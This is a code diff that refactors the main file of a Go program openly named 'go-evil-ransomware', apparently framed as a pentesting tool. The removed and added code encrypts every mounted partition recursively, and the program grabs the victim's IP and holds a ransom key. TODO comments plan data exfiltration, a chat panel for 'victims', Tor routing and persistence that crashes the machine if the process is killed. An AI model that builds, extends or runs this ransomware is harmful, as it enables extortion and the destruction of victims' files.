@@ -3,12 +3,9 @@ package main
 import (
 	"fmt"
 	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
-	"github.com/shirou/gopsutil/disk"
 	"go-evil-ransomware/ransom"
 	"os"
 	"os/user"
-	"runtime"
-	"sync"
 )
 
 //TODO:
@@ -24,9 +21,15 @@ import (
 //maybe add a setting to start the ransomware when the user was afk for more than X minutes
 //clean the main function making functions in the ransomware package
 //on windows persistence could be added by marking the process as "essential", making the computer BSOD on process exit
+//send the data
+//make a live thingy panel, so "victims" could talk to the pentester through a live chat
+//and the pentester could remotely decrypt their files
+//route everything through tor or test if it works through tor
+//if offline the panel wouldn't work, have the option to either wait until the victim gets online, or encrypt with static key
+//try with websocket?
 
 func init() {
-	//wait until there's internet
+
 }
 
 type RansomData struct {
@@ -38,29 +41,10 @@ type RansomData struct {
 }
 
 func main() {
-	partitions, _ := disk.Partitions(false)
-
-	var wg sync.WaitGroup
-
 	//Handle decryption
 	if len(os.Args) > 2 && os.Args[1] == "decrypt" {
 		keyBytes := []byte(os.Args[2])
-		for _, partition := range partitions {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				var err error
-				if runtime.GOOS == "windows" {
-					err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint+"\\", keyBytes)
-				} else {
-					err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint, keyBytes)
-				}
-				if err != nil {
-					fmt.Println(err)
-				}
-			}()
-		}
-		wg.Wait()
+		ransom.DecryptEveryPartition(keyBytes)
 		fmt.Println("Done...")
 		return
 	}
@@ -78,32 +62,13 @@ func main() {
 	fmt.Println(data)
 
 	if ransom.Debug {
+		fmt.Println("WARNING: Starting to encrypt files...")
+		fmt.Println("Press enter to continue")
+		fmt.Scan()
 		return
 	}
 
-	//for each partition, launch a new routine and wait for all to complete
-	//because the ransomware will recursively run on /, it will on any partition anyway but not concurrently, think of a way to skip checking already encrypted paths that
-	//doesn't affect performance
-	fmt.Println("WARNING: Starting to encrypt files...")
 	keyBytes := []byte(data.Key)
-	for _, partition := range partitions {
-		wg.Add(1)
-
-		go func() {
-			defer wg.Done()
-			var err error
-			if runtime.GOOS == "windows" {
-				err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint+"\\", keyBytes)
-			} else {
-				err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint, keyBytes)
-			}
-
-			if err != nil {
-				fmt.Println(err)
-			}
-		}()
-	}
-	wg.Wait()
-	ransom.CreateMessage()
+	ransom.EncryptEveryPartition(keyBytes)
 	fmt.Println("Exiting...")
 }
